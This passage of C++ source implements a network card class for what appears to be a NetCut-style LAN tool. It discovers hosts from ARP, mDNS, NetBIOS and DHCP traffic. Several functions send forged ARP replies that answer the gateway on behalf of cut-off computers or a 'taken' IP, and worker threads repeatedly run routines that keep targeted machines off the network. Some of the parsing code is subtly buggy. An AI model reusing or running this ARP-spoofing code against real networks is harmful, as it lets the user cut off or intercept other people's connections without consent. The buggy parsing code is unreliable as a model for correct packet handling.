	SendArpWrapper(packet.m_nARPSrcIP, packet.m_nARPDstIP,
			packet.m_ARPSrcMac.data(), mymac, packet.m_ARPSrcMac.data(), mymac,
			ARPOP_REPLY);
}
void CnetCard::MakesureOffOnProcess(const CPacketBase & packet) {

	m_lock.lock();

	do {

		if (!this->m_computers.count(packet.m_EtherSrc))
			break; //not my known computer;

		if (CAddressHelper::isBrocastMAC(packet.m_EtherDST.data())
				&& m_computers[packet.m_EtherSrc].IsOff()) { // 受屏蔽的网卡会广播查询谁是真的IP，网关会回答，这个时候需要再次发送查询包

			this->MakeSureOffOn(m_computers[packet.m_EtherSrc]);
			//如果受屏蔽的网卡是恶意网卡，则回答查询

		}

		CComputer * pComputer = GetComputerByIP(packet.m_nARPDstIP);

		if (pComputer == NULL)
			break;
		if (packet.m_nARPOP == ARPOP_REQUEST
				&& this->IsGateWayMac(packet.m_EtherSrc) //网关会查询谁是真的IP，广播和直播，需要回答
				&& pComputer->IsOff()) {
			TRACE("working on %s\n",
					CAddressHelper::IntIP2str(packet.m_nARPDstIP).c_str());

			//	this->MakeSureOffOn(*pComputer, ARPOP_REPLY);	//回答网管查询
			ReplyQuery(packet, pComputer);

		}
	} while (false);

	m_lock.unlock();
}

void CnetCard::ProcessTakeIP(const CPacketBase & packet) {
	if (GetTakeIP() == 0)
		return;  //have no taken any IP yet
	m_lock.lock();

	do {

		//Sender is Gateway and Target is Take IP

		if (packet.m_nARPDstIP == this->GetTakeIP()
				&& (this->IsGateWayMac(packet.m_EtherSrc)
						|| (CAddressHelper::isBrocastMAC(
								packet.m_EtherDST.data())
								&& packet.m_nARPSrcIP == 0))) {
			if (packet.m_nARPOP == ARPOP_REQUEST) {

				/*	TRACE("%s asking verifiying IP %s\n",
				 CAddressHelper::IntIP2str(packet.m_nARPSrcIP).c_str(),
				 CAddressHelper::IntIP2str(packet.m_nARPDstIP).c_str());

				 TRACE("%s Answer  IP %s\n",
				 CAddressHelper::IntIP2str(packet.m_nARPDstIP).c_str(),
				 CAddressHelper::IntIP2str(packet.m_nARPSrcIP).c_str());
				 */

				u_char MyMacBuf[6];
				this->getMac(MyMacBuf);
				int retry = 0;
				while (!this->sendArp(packet.m_nARPSrcIP, packet.m_nARPDstIP,
						(u_char *) packet.m_pEthernet->ether_shost, MyMacBuf,
						(u_char *) packet.m_pARP->arp_sha, MyMacBuf,
						ARPOP_REPLY)) {
					msleep(50);
					if (retry++ > 3)
						break;
				} //回答查询
			}
		}
	} while (false);

	m_lock.unlock();

}

void CnetCard::OnMDNSPacket(const CPacketBase & packet) {

	if (packet.m_nPayloadSize < sizeof(DNS_HEADER))
		return;
	//DNS_HEADER *dns=(struct DNS_HEADER*)packet.m_sPayload;
//TRACE("Get MDNS packet from %s",CAddressHelper::IntIP2str(packet.m_nIPSrc).c_str());

	m_lock.lock();

	DNS dns((const unsigned char*) packet.m_sPayload, packet.m_nPayloadSize);

	for (const auto& answer : dns.additional()) {
		switch (answer.type()) {
		case T_A: {
			DWORD nIP = CAddressHelper::StrIP2Int(answer.data());
			string sName = CAddressHelper::GetDNS_PTRname(answer.dname());
			if (nIP != 0) {
				CComputer *node = GetComputerByIP(nIP);
				if (node != NULL) {
					AddMac2Name(node->GetMacArray(), sName);

				}
			}
			break;
		}
		default:
			break;
		}
	}

	for (const auto& answer : dns.answers()) {
		// Process a query
		//	TRACE("Name: %s %s %d\n", answer.dname().c_str(), answer.data().c_str(),answer.type());
		switch (answer.type()) {
		case T_PTR: {
			DWORD nIP = CAddressHelper::GetDNS_inaddr(answer.dname());
			string sName = CAddressHelper::GetDNS_PTRname(answer.data());
			if (nIP != 0) {
				CComputer *node = GetComputerByIP(nIP);
				if (node != NULL) {
					AddMac2Name(node->GetMacArray(), sName);
				}
			}
			break;
		}
		case T_A: {
			DWORD nIP = CAddressHelper::StrIP2Int(answer.data());
			string sName = CAddressHelper::GetDNS_PTRname(answer.dname());
			if (nIP != 0) {
				CComputer *node = GetComputerByIP(nIP);
				if (node != NULL) {
					AddMac2Name(node->GetMacArray(), sName);
				}
			}
			break;
		}

		case T_TXT: {

			string sName = CAddressHelper::GetDNS_TXTDeviceInfo(answer.dname());
			if (sName != answer.dname()) {
				sName += "(" + answer.data() + ")";
				AddMac2Name(packet.m_EtherSrc, sName);
				//if(m_computers.count(packet.m_EtherSrc)) m_computers[packet.m_EtherSrc].SetName(sName);
			}

			break;
		}
		default:
			break;
		}
	}
	m_lock.unlock();
}
void CnetCard::OnNetBiosPacket(const CPacketBase & packet) {

	const struct sniff_ip *ip; /* The IP header */
	const struct libnet_udp_hdr *udp;

	int size_ip;
	int netbiosdatasize;

	struct NMBpacket *pak;
	struct NMB_query_response rsp;
	memset(&rsp, 0, sizeof rsp);

	ip = packet.m_pIP;
	size_ip = IP_HL(ip) * 4;

	udp = packet.m_pUDP;
	netbiosdatasize = ntohs(ip->ip_len) - size_ip - sizeof(libnet_udp_hdr);

	pak = (struct NMBpacket *) ((u_char *) udp + sizeof(libnet_udp_hdr));
	if (!pak->flags & 0x10000000)  //https://tools.ietf.org/html/rfc1002
		return;  // not a response packet

	if (this->GetIPTransID(ip->ip_src.s_addr) != ntohs(pak->tranid)) {
		//	TRACE("Wrong trans ID\n");
		return;
	}

	char errbuf[256];
	if (parse_nbtstat(pak, netbiosdatasize, &rsp, errbuf)) {

		char computername[32];
		bzero(computername, 32);

		if (rsp.domain[0] == '\0' && rsp.computer[0] == '\0')
			sprintf(computername, "-no name-");
		else {
			//sprintf(computername, "%s\\%s", rsp.domain, rsp.computer);
			sprintf(computername, "%s", rsp.computer);

			string rets = computername;

			//	SetComputerName(packet.m_EtherSrc, rets);
			this->AddMac2Name(packet.m_EtherSrc, rets);

		}

	}

	//		TRACE("responsed from IP %s ID %ud and %ud",CAddressHelper::IntIP2str(rsp.remote.sin_addr.s_addr).c_str(),pak.tranid,ntohs(pak.tranid));

}
void CnetCard::OnDHCPPacket(const CPacketBase & packet) {

	const struct sniff_ip *ip;
	const struct libnet_udp_hdr *udp;
	const struct dhcp * dhcpheader;
	int size_ip;

	//const struct sniff_ethernet *ethernet;

	/*
	 ethernet = (struct sniff_ethernet*) (packet);
	 ip = (struct sniff_ip*) (packet + SIZE_ETHERNET);
	 */

	//ethernet = packet.m_pEthernet;
	ip = packet.m_pIP;
	size_ip = IP_HL(ip) * 4;

	int dhcpdatasize;

	//udp = (libnet_udp_hdr *) ((u_char*) ip + size_ip);
	udp = packet.m_pUDP;
	dhcpdatasize = ntohs(ip->ip_len) - size_ip - sizeof(libnet_udp_hdr)
			- sizeof(libnet_dhcpv4_hdr);

	dhcpheader = (struct dhcp *) ((u_char *) udp + sizeof(libnet_udp_hdr));

	if (dhcpheader->op != LIBNET_DHCP_REQUEST)
		return;  //we only care about the request

	struct dhcpoption {
		u_char optionType;
		u_char len;
		u_char dataHeader;
	};

	u_char *s = (u_char *) &dhcpheader->options[4];
	dhcpoption *o = (dhcpoption *) s;
	string hostname;
	string vendorclass;
	while (o->optionType != 255 && (u_char *) o - s < dhcpdatasize) {
		u_char *ep;
		int size;
		u_char tag;
		tag = o->optionType;
		size = o->len;
		ep = (u_char *) o;

		while (tag == 0) {
			o = (dhcpoption *) ((u_char *) o + 1);
		}
		if (tag == LIBNET_DHCP_HOSTNAME) {
			//string hostname((u_char *)o->dataHeader,o->len);
			string hostname2((const char *) o + 2, size);
			hostname = hostname2;
			// TRACE("hostname %s\n",hostname.c_str());

		}
		if (tag == LIBNET_DHCP_CLASSSID) {
			//string hostname((u_char *)o->dataHeader,o->len);
			string hostname2((const char *) o + 2, size);
			vendorclass = hostname2;
			// TRACE("hostname %s\n",hostname.c_str());

		}

		o = (dhcpoption *) (ep + 2 + size);

	}

	this->AddMac2Name(packet.m_EtherSrc,
			hostname == "" ? vendorclass : hostname);

}
void CnetCard::OnArpPacket(const CPacketBase & packet) {
	NewComputerProcess(packet);
	MakesureOffOnProcess(packet);
	ProcessTakeIP(packet);
	DefenderProcess(packet);
	DetectNetcutDefender(packet);

}
/*
 void CnetCard::ProcessForward(u_char *packet, uint32_t p_nPacketLen) {

 struct sniff_ethernet *ethernet;

 ethernet = (struct sniff_ethernet*) (packet);

 if (ntohs(ethernet->ether_type) != ETHERNET_TYPE_IP)
 return;

 const struct sniff_ip *ip;
 ip = (struct sniff_ip*) (packet + SIZE_ETHERNET);

 DWORD targetIP = ip->ip_dst.s_addr;


 if ((targetIP == CnetCard::m_nMyIP) || targetIP == CnetCard::m_nMyFakeIP)
 return;

 // if(senderIP!=CAddressHelper::StrIP2Int("192.168.1.12")) return;
 //Get Target Mac,  if the target IP is known from computer list, use that mac, otherwise use default gateway mac
 libnet_t * LibnetHandle;
 do {

 int p_tag;

 LibnetHandle = libnet_init(LIBNET_LINK_ADV, this->getDevName().c_str(),
 m_sErrbuf);

 //	TRACE("FORWARDING from %s to %s target Mac %s\n",CAddressHelper::IntIP2str(senderIP).c_str(),CAddressHelper::IntIP2str(targetIP).c_str(),CAddressHelper::BufferMac2str(this->m_computers.count(targetIP)?m_computers[targetIP].GetMac():m_AddressDefaultGateWay->buff).c_str());

 //	char CnetCard::m_sMyMac[6];
 //	char CnetCard::m_sGateMac[6];
 p_tag = libnet_build_ethernet((uint8_t *) CnetCard::m_sGateMac,
 (uint8_t *) CnetCard::m_sMyMac, ETHERTYPE_IP, (uint8_t*) ip,
 p_nPacketLen - SIZE_ETHERNET, LibnetHandle, 0);
 if (p_tag == -1) {
 TRACE("libnet_build_ethernet err!\n");
 break;

 }


 int res = libnet_write(LibnetHandle);

 if (res == -1) {

 TRACE("Libnet Write err!\n");

 break;

 }
 } while (false);

 libnet_clear_packet(LibnetHandle);

 libnet_destroy(LibnetHandle);

 }
 */
void CnetCard::OnTCPPacket(const CPacketBase & packet) {

	this->m_lock.lock();

	do {
		if (this->m_ConnectTest.nNextAction == this->TEST_ACTION::NOMORETEST)
			break;

		if (this->m_ConnectTest.nIP == packet.m_nIPSrc
				&& m_ConnectTest.nport == packet.m_nTCPSrcPort
				&& m_ConnectTest.nACKNumber == packet.m_nTCPACK) {

			m_ConnectTest.nPacketTimeStampe = 0;
			if (m_ConnectTest.nNextAction == this->TEST_ACTION::DIRECTTEST) //direct working going to test NAT
					{
				m_ConnectTest.nNextAction = TEST_ACTION::NATTEST;

			} else {

				m_ConnectTest.nNextAction = TEST_ACTION::NATTESTOK; //NAT working, no need further test
			}
			break;
		}

		if (m_ConnectTest.nPacketTimeStampe != 0&&_helper_GetMiTime()
		- m_ConnectTest.nPacketTimeStampe>WAITEXPIRE_TIMER) {
			m_ConnectTest.nNextAction = TEST_ACTION::NOMORETEST;
		}

	} while (false);

	this->m_lock.unlock();

}
void CnetCard::OnIPPacket(const CPacketBase & packet) {

	if (packet.m_nIPSrc == 0)
		return;  // this guy has no IP yet
	/*
	 if (!this->IsMyIP(packet.m_nIPDst)
	 && memcmp(CAddressHelper::m_macBrocast,
	 packet.m_pEthernet->ether_dhost, 6) != 0
	 && !CAddressHelper::isBrocastIP(packet.m_nIPDst))
	 return; // not target to me , not brocast mac, not brocast ip reture
	 */
	//	TRACE(" IP %s",CAddressHelper::IntIP2str(packet.m_nIPSrc).c_str());
	if (this->IsKnownNode(packet))
		return;  // I have this node already

	if (this->IsGateWayMac(packet.m_EtherSrc) && !IsMyNetwork(packet.m_nIPSrc))
		return;

//	TRACE("Because of IP Start query %s",CAddressHelper::IntIP2str(packet.m_nIPSrc).c_str());

	this->AddIP2Query(packet);
	/*
	 this->ArpQueryIP(packet.m_nIPSrc,
	 (u_char *) packet.m_pEthernet->ether_shost);
	 */

}
/*
 void CnetCard::OnIPPacket(u_char *packet, uint32_t p_nPacketLen) {

 //	ProcessForward(packet,p_nPacketLen);

 const struct sniff_ethernet *ethernet;

 ethernet = (struct sniff_ethernet*) (packet);

 const struct sniff_ip *ip;
 ip = (struct sniff_ip*) (packet + SIZE_ETHERNET);
 DWORD newIP = ip->ip_src.s_addr;
 DWORD targetIP = ip->ip_dst.s_addr;
 MACADDR srcMac = CAddressHelper::MacBuffer2Array(ethernet->ether_shost);

 if (newIP == 0)
 return;  // this guy has no IP yet
 if (!this->IsMyIP(targetIP)
 && memcmp(CAddressHelper::m_macBrocast, ethernet->ether_dhost, 6)
 != 0 && !CAddressHelper::isBrocastIP(targetIP))
 return; // not target to me , not brocast mac, not brocast ip reture

 if (this->IsKnownIP(newIP))
 return;  // I have this IP already

 if (this->IsGateWayPacket(srcMac, newIP))
 return;
 TRACE("new IP %s\n", CAddressHelper::IntIP2str(newIP).c_str());
 this->ArpQueryIP(newIP, (u_char *) ethernet->ether_shost);

 }

 void* CnetCard::threadConnectMe(void *para) {
 CnetCard * c = (CnetCard *) para;
 c->threadConnectMeRun();
 return NULL;

 }
 void CnetCard::threadConnectMeRun() {

 while (!this->m_EventsQuit.WaitForEvent(50)) {

 if (this->m_nConnectMeRequest != this->ConnectMeStatus::START)
 continue;

 }

 }
 */

void* CnetCard::threadArpCacheReader(void *para) {

	CnetCard * c = (CnetCard *) para;
	c->threadArpCacheReaderRun();
	return NULL;

}
void CnetCard::threadArpCacheReaderRun() {

	while (!this->m_EventsQuit.WaitForEvent(500)) {
		if (m_EventsScanSent.WaitForEvent(500)) {
			msleep(1000 * 3);
			m_EventsScanSent.ResetEvent();
			map<DWORD, MACADDR> arpmap = CAddressHelper::GetARPCache(
					this->m_sDevName);

			map<DWORD, MACADDR>::iterator it;

			for (it = arpmap.begin(); it != arpmap.end(); ++it) {
				MACADDR &sMac = (*it).second;
				const DWORD &nIP = (*it).first;
				//TRACE("IP %s Mac %s\n",CAddressHelper::IntIP2str(nIP).c_str(),CAddressHelper::BufferMac2str(sMac.data()).c_str());

				if (m_queryHistory.count(nIP)) {
					m_queryHistory.erase(nIP);
					this->AddnewComputer(sMac, nIP);
				}
			}
		}
	}

	//("Arp cache thread done\n");

}
void* CnetCard::threadGroundedWorker(void *para) {
	CnetCard * c = (CnetCard *) para;
	c->threadGroundedWorkerRun();
	return NULL;

}
void CnetCard::threadGroundedWorkerRun() {

	unsigned long nLastCheckMinutes = 0;
	while (!this->m_EventsQuit.WaitForEvent(3 * 1000)) {

		time_t theTime = time(NULL);
		struct tm *aTime = localtime(&theTime);
		if (nLastCheckMinutes == aTime->tm_min)
			continue;
		nLastCheckMinutes = aTime->tm_min;

		m_lock.lock();

		std::map<MACADDR, CComputer>::iterator it;

		for (it = m_computers.begin(); it != m_computers.end(); ++it) {
			CComputer &computer = (*it).second;

			if (computer.HasGroundedSetting()) {
				computer.GroundedRoutine();
				this->OnComputerUpdate(computer);
			}
		}

		m_lock.unlock();

	}

	//TRACE("ground info thread exit\n");
}
void* CnetCard::threadComputerInfoWorker(void *para) {

	CnetCard * c = (CnetCard *) para;
	c->threadComputerInfoWorkerRun();
	return NULL;

}

bool CnetCard::DemandDisCoverNetwork() {

	if (this->m_GatewayIPMap.size() == 0) //if no gateway has been given. request it.
			{
		DWORD nGateIP = 0;
		if (CAddressHelper::GetDevGateIP(this->m_sDevName, nGateIP)) {
			this->AddmyGateWay(nGateIP);
		}
	}

	for (std::map<DWORD, Address>::iterator it = m_IPs.begin();
			it != m_IPs.end(); ++it) {
		Address& s = (*it).second;

		this->AddnewComputer(CAddressHelper::MacBuffer2Array(this->m_sMac),
				s.Ip);

	}

	this->DiscoverNetwork();
	return true;
}

void CnetCard::threadComputerInfoWorkerRun() {

	while (!this->m_EventsQuit.WaitForEvent(1 * 10)) {

		try {
			DiscoverTask n = this->m_DiscoverFinnalArray.RemoveHead();
			if (!n.bSingleIP)
				this->DiscoverNetwork(n.nIP);
			else {

				QueryIP(n.nIP, n.MAC.data());

			}

		} catch (...) {
			//	TRACE("System shut down happen in Blocking array\n");
			break;
		}

	}

//	TRACE("Thread Make sure Computer Info Close\n");
}

void CnetCard::FixMac2Name(const MACADDR & p_mac, string p_sName) {
	m_lock.lock();

	do {

		m_Name2MacList[p_mac].bFixed = true;
		m_Name2MacList[p_mac].sName = p_sName;
		this->SetComputerName(p_mac, p_sName);

		SaveMacNodeName();
	} while (false);
	m_lock.unlock();

}

void CnetCard::AddMac2Name(const MACADDR & p_mac, string p_sName) {
	m_lock.lock();

	do {

		if (m_Name2MacList.count(p_mac) && m_Name2MacList[p_mac].bFixed)
			break;

		m_Name2MacList[p_mac].sName = p_sName;
		m_Name2MacList[p_mac].bFixed = false;

		this->SetComputerName(p_mac, p_sName);

		SaveMacNodeName();
	} while (false);
	m_lock.unlock();

}
string CnetCard::QueryMac2Name(const MACADDR & mac) {

	m_lock.lock();

	string s = "";

	if (m_Name2MacList.count(mac))
		s = m_Name2MacList[mac].sName;

	m_lock.unlock();

	return s;

}
void* CnetCard::threadMakeSureMeLive(void *para) {
	CnetCard * c = (CnetCard *) para;
	c->threadMakeSureMeLiveRun();
	return NULL;
}
void CnetCard::threadMakeSureMeLiveRun() {

	unsigned long nLastTimeBrocastIamNetCut = 0;
	unsigned long nLastTimeCleanQueryHistory = 0;
	while (!this->m_EventsQuit.WaitForEvent(2 * 1000)) {

		//TRACE("Start Protect myself\n");
		if (!m_computers.count(m_MACADD)) {
			continue;
		}

		if (!this->m_bProtection)
			continue;

		if (_helper_GetMiTime()
				- nLastTimeBrocastIamNetCut>SAYNETCUT_FLAG_SIGN) {
			SayIAmNetCut();

			nLastTimeBrocastIamNetCut = _helper_GetMiTime();
		}
		if (GetIsBeenAttack()) {
			unsigned long i = _helper_GetMiTime();
			while (_helper_GetMiTime() - i < TIMEOUT_OVERCOME_ATTACK) {
				this->MakeSureOffOn(m_computers[m_MACADD]);
				msleep(45);
			}
		}

		this->MakeSureOffOn(m_computers[m_MACADD]);

		if (_helper_GetMiTime()
				- nLastTimeCleanQueryHistory>MAX_TAKEIP_WAIT_SECONDS) {
			this->CleanUpARPQueryHistory();
			nLastTimeCleanQueryHistory = _helper_GetMiTime();
		}
		/*
		 if (m_EventsTakeIP.WaitForEvent(MAX_TAKEIP_WAIT_SECONDS))
		 {
		 this->m_lock.lock();
		 if (m_ConnectTest.nNextAction != TEST_ACTION::NOMORETEST) {
		 if (m_ConnectTest.nNextAction < this->TEST_ACTION::NATTESTOK) {
		 this->TestConnection();
		 }
		 if (NATTESTOK == m_ConnectTest.nNextAction) {
		 m_ConnectTest.nNextAction = TEST_ACTION::NOMORETEST;
		 }
		 }
		 this->m_lock.unlock();

		 }
		 */

	}

//	TRACE("Thread Make sure ME Live Close\n");
}
void* CnetCard::threadMakeSureOnOffWorker(void *para) {

	CnetCard * c = (CnetCard *) para;
	c->threadMakeSureOnOffWorkerRun();
	return NULL;

}
void CnetCard::threadMakeSureOnOffWorkerRun() {
	while (!this->m_EventsQuit.WaitForEvent(1 * 500)) {
		MakeSureoffAll();
	}

//	TRACE("Thread Make sure on off Close\n");
}
/*
 void CnetCard::ClearSendAdapter(libnet_t * p_LibnetHandle) {

 if (p_LibnetHandle != NULL) {

 libnet_clear_packet(p_LibnetHandle);

 libnet_destroy(p_LibnetHandle);

 }

 }
 */
/*
 bool CnetCard::InitSendAdapter() {

 bool bRet = true;
 m_lock.lock();
 if (m_LibnetHandle == NULL) {

 m_LibnetHandle = libnet_init(LIBNET_LINK_ADV,
 this->getDevName().c_str(), m_sErrbuf);
 if (m_LibnetHandle == NULL) {
 TRACE("libnet_init err!/n");
 TRACE("%s", m_sErrbuf);
 bRet = false;

 }
 }
 this->m_lock.unlock();
 return bRet;
 }
 */

void CnetCard::MakeArpSrcMac(u_char *p_sBuf) {
	m_lock.lock();
	//CAddressHelper::GetRandomMac(p_sBuf);
	this->getMac(p_sBuf);
	m_lock.unlock();

}
string CnetCard::GetMacID() {
	m_lock.lock();

	MD5 md5er(CAddressHelper::BufferMac2str(this->m_MACADD.data()));

	m_lock.unlock();
	return md5er.hexdigest();

}

bool CnetCard::getMacforIP(const DWORD & p_nIP, u_char *p_sBuf) {
	/*
	 * Check if IP is outside of the ip rang, if yes, return gate mac, otherwise, look from local map
	 *
	 *
	 */
	bool bRet = false;
	m_lock.lock();

	if (!CAddressHelper::isSameRang(p_nIP, this->m_nMyIP, this->m_nMask)) {
		if (this->m_nDefaultGateWayIP != 0) {
			bRet = true;
			memcpy(p_sBuf, this->m_MACGateMac.data(), 6);
		}
	} else {
		if (this->m_ip2mac.find(p_nIP) != m_ip2mac.end()) {
			bRet = true;
			memcpy(p_sBuf, m_ip2mac[p_nIP].data(), 6);
		}
	}
	m_lock.unlock();

	return bRet;

}
void CnetCard::getMac(u_char * p_buf) {
	m_lock.lock();
	memcpy(p_buf, this->m_sMac, 6);

	m_lock.unlock();

}

bool CnetCard::SendDhcpOffer() {

	bool bRet = true;
	return bRet;

}

/*
 bool CnetCard::SendDhcp() {
 m_lock.lock();
 bool bRet = true;
 libnet_t * LibnetHandle = this->InitSendAdapter();

 do {

 u_char *options;

 u_long options_len, orig_len;
 int i;

 libnet_ptag_t t;
 libnet_ptag_t ip;
 libnet_ptag_t udp;
 libnet_ptag_t dhcp;

 u_char options_req[] = { LIBNET_DHCP_SUBNETMASK,
 LIBNET_DHCP_BROADCASTADDR, LIBNET_DHCP_TIMEOFFSET,
 LIBNET_DHCP_ROUTER, LIBNET_DHCP_DOMAINNAME, LIBNET_DHCP_DNS,
 LIBNET_DHCP_HOSTNAME };
 u_char enet_dst[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
 u_char *tmp;

 // build options packet
 i = 0;
 options_len = 3;            // update total payload size

 // we are a discover packet
 options = (u_char *) malloc(3);
 options[i++] = LIBNET_DHCP_MESSAGETYPE;     // type
 options[i++] = 1;           // len
 options[i++] = LIBNET_DHCP_MSGDISCOVER;     // data

 orig_len = options_len;
 options_len += sizeof(options_req) + 2;     // update total payload size

 // workaround for realloc on old machines
 // options = realloc(options, options_len); // resize options buffer
 tmp = (u_char *) malloc(options_len);
 memcpy(tmp, options, orig_len);
 free(options);
 options = tmp;

 // we are going to request some parameters
 options[i++] = LIBNET_DHCP_PARAMREQUEST;    // type
 options[i++] = sizeof(options_req); // len
 memcpy(options + i, options_req, sizeof(options_req));      // data
 i += sizeof(options_req);

 // end our options packet
 // workaround for realloc on old machines
 // options = realloc(options, options_len); // resize options buffer
 orig_len = options_len;
 options_len += 1;
 tmp = (u_char *) malloc(options_len);
 memcpy(tmp, options, orig_len);
 free(options);
 options = tmp;
 options[i++] = LIBNET_DHCP_END;

 // make sure we are at least the minimum length, if not fill
 // this could go in libnet, but we will leave it in the app for now
 if (options_len + LIBNET_DHCPV4_H < LIBNET_BOOTP_MIN_LEN) {
 orig_len = options_len;
 options_len = LIBNET_BOOTP_MIN_LEN - LIBNET_DHCPV4_H;

 // workaround for realloc on old machines
 // options = realloc(options, options_len);
 tmp = (u_char *) malloc(options_len);
 memcpy(tmp, options, orig_len);
 free(options);
 options = tmp;

 memset(options + i, 0, options_len - i);
 }
 u_char mymac[6];
 this->GetFakeMac(mymac);
 //	u_char gatemac[6];

 // the goodies are here
 dhcp = libnet_build_dhcpv4(LIBNET_DHCP_REQUEST,     // opcode
 1,       // hardware type
 6,       // hardware address length
 0,       // hop count
 0xdeadbeee,      // transaction id
 0,       // seconds since bootstrap
 0x8000,  // flags
 0,       // client ip
 0,       // your ip
 0,       // server ip
 0,       // gateway ip
 mymac,    // client hardware addr
 //unamac,                      // client hardware addr
 NULL,// server host name
 NULL,    // boot file
 options, // dhcp options stuck in payload since it is dynamic
 options_len,     // length of options
 LibnetHandle,    // libnet handle
 0);      // libnet id

 if (dhcp == -1) {
 //	TRACE("libnet_build err!\n");

 bRet = false;
 break;

 }
 // wrap it
 udp = libnet_build_udp(68,  // source port
 67,  // destination port
 LIBNET_UDP_H + LIBNET_DHCPV4_H + options_len,     // packet size
 0,   // checksum
 NULL,        // payload
 0,   // payload size
 LibnetHandle,    // libnet handle
 0);  // libnet id

 if (udp == -1) {
 TRACE("libnet_build err!\n");

 bRet = false;
 break;

 }
 // hook me up with some ipv4
 ip = libnet_build_ipv4(
 LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DHCPV4_H + options_len, // length
 0x10,        // TOS
 0,   // IP ID
 0,   // IP Frag
 16,  // TTL
 IPPROTO_UDP, // protocol
 0,   // checksum
 inet_addr("0.0.0.0"),        // src ip
 inet_addr("255.255.255.255"),        // destination ip
 NULL,        // payload
 0,   // payload size
 LibnetHandle,    // libnet handle
 0);  // libnet id

 if (ip) {
 TRACE("libnet_build err!\n");

 bRet = false;
 break;

 }
 // we can just autobuild since we arent doing anything tricky
 t = libnet_autobuild_ethernet(enet_dst,     // ethernet destination
 ETHERTYPE_IP, // protocol type
 LibnetHandle);        // libnet handle

 if (t == -1) {
 TRACE("libnet_build_ethernet err!\n");

 bRet = false;
 break;

 }


 int res = libnet_write(LibnetHandle);

 if (res == -1) {

 TRACE("Libnet Write err!\n");
 bRet = false;
 break;

 }

 } while (false);

 ClearSendAdapter(LibnetHandle);
 m_lock.unlock();
 return bRet;

 }

 bool CnetCard::sendArp(const DWORD &p_DstIP, const DWORD &p_SrcIp,
 const u_char *p_sDstMac, const u_char *p_sSrcMac,
 const u_char *p_sEtherDstMac, const u_char * p_sEtherSrcMac,
 const uint16_t p_nRequesttype) {
 m_lock.lock();
 unsigned long nDelay = _helper_GetMiTime() - m_nLastLibNetWriteTime;
 if (nDelay < 10) {
 msleep(10 - nDelay);
 }
 bool bRet = true;
 libnet_t * LibnetHandle = this->InitSendAdapter();
 do {

 if (LibnetHandle == NULL) {

 bRet = false;
 break;

 }

 u_char MacBuff[6];
 this->getMac(MacBuff);

 const u_char *EtherDsc = p_sEtherDstMac;
 const u_char *EtherSrc = p_sEtherSrcMac;
 const u_char *ArpDstMac = p_sDstMac;
 const u_char *ArpSrcMac = p_sSrcMac;


 //	p_sEtherSrcMac = MacBuff;
 //	if (p_sSrcMac == 0)
 //		p_sSrcMac = &MacBuff[0];
 //	if (p_sDstMac == 0)
 //		p_sDstMac = CAddressHelper::m_macBrocast;
 //	if (p_sEtherDstMac == 0)
 //		p_sEtherDstMac = CAddressHelper::m_macBrocast;

 libnet_ptag_t p_tag;

 p_tag = libnet_autobuild_arp(p_nRequesttype, (uint8_t *) ArpSrcMac,
 (uint8_t *) &p_SrcIp, (uint8_t *) ArpDstMac,
 (uint8_t*) &p_DstIP, LibnetHandle);

 if (p_tag == -1) {
 TRACE("libnet_build_arp err!\n");

 bRet = false;
 break;

 }

 //libnet_build_ethernet(const uint8_t *dst, const uint8_t *src, uint16_t type,  const uint8_t* payload, uint32_t payload_s, libnet_t *l, libnet_ptag_t ptag);


 p_tag = libnet_build_ethernet((uint8_t *) EtherDsc,
 (uint8_t *) EtherSrc, ETHERTYPE_ARP, NULL, 0, LibnetHandle, 0);
 if (p_tag == -1) {
 TRACE("libnet_build_ethernet err!\n");

 bRet = false;
 break;

 }


 int res = libnet_write(LibnetHandle);

 if (res == -1) {

 TRACE("Libnet Write err!\n");
 bRet = false;
 break;

 }

 } while (false);

 if (LibnetHandle != NULL) {
 libnet_clear_packet(LibnetHandle);

 libnet_destroy(LibnetHandle);
 }

 //pthread_mutex_unlock(&m_lockIO);
 m_nLastLibNetWriteTime = _helper_GetMiTime();
 m_lock.unlock();
 return bRet;



 }
 */

void CnetCard::CleanUpARPQueryHistory() //Take none response IP her
{
	m_lock.lock();

	std::map<DWORD, Address>::iterator it;

	for (it = m_queryHistory.begin(); it != m_queryHistory.end();) {

		Address &Add = (*it).second;
		/*
		 if (this->m_bProtection && GetTakeIP() == 0
		 && _helper_GetMiTime() - Add.nUpdateTime
		 > MAX_TAKEIP_WAIT_SECONDS
		 && CAddressHelper::isSameRang(Add.Ip, this->GetMyIP(),
		 this->GetMyMask())) {

		 this->TakeIP(Add.Ip);
		 }
		 */
		if (_helper_GetMiTime() - Add.nUpdateTime > MAXQUERYAGEMISECONDS) {

			m_queryHistory.erase(it++);

		} else {
			++it;
		}

	}

	m_lock.unlock();
}

void CnetCard::AddQueryHistory(const DWORD & p_IP, int p_nMyIP,
		u_char * p_targetbuf) {
	m_lock.lock();

	this->m_queryHistory[p_IP].Ip = p_IP;
	this->m_queryHistory[p_IP].Mask = p_nMyIP;

	memcpy(&m_queryHistory[p_IP].buff[0], p_targetbuf, 6);

	this->m_queryHistory[p_IP].nUpdateTime = _helper_GetMiTime();

	m_lock.unlock();
}
bool CnetCard::IsRecentQuery(const DWORD & p_IP, int p_nMyIP,
		u_char * p_targetbuf) {

	bool bHasQuery = false;
	m_lock.lock();

	if (m_queryHistory.count(p_IP) && m_queryHistory[p_IP].Mask == p_nMyIP
			&& memcmp(m_queryHistory[p_IP].buff, p_targetbuf, 6) == 0
			&& _helper_GetMiTime() - m_queryHistory[p_IP].nUpdateTime < 1000) {
		TRACE("I recently queried this in less than 1 seconds %s\n",
				CAddressHelper::IntIP2str(p_IP).c_str());

		bHasQuery = true;

	}

	m_lock.unlock();

	return bHasQuery;
}

bool CnetCard::QueryIP(const DWORD & p_IP, u_char * p_buf) {

	bool bRet = true;

	do {

		//	TRACE("Query IP %s \n", CAddressHelper::IntIP2str(p_IP).c_str());

		if (p_IP == 0)
			break;
		if ((p_buf == 0||(p_buf != 0 && CAddressHelper::isBrocastMAC(p_buf)))&& this->IsKnownIP(p_IP))
			break;

		if (p_buf != 0 &&this->IsKnownNode(p_buf,p_IP))
			break;


		if (IsMyGateIP(p_IP)) {
			TRACE("scaning Gateway %s %s\n",CAddressHelper::IntIP2str(p_IP).c_str(),p_buf!=0?CAddressHelper::BufferMac2str(p_buf).c_str():"[Empty]");
			msleep(1000);
		}

		if (!this->ArpQueryIP(p_IP, p_buf)) {
			msleep(50);
			this->ArpQueryIP(p_IP, p_buf);
		}

	} while (false);
	return bRet;
}
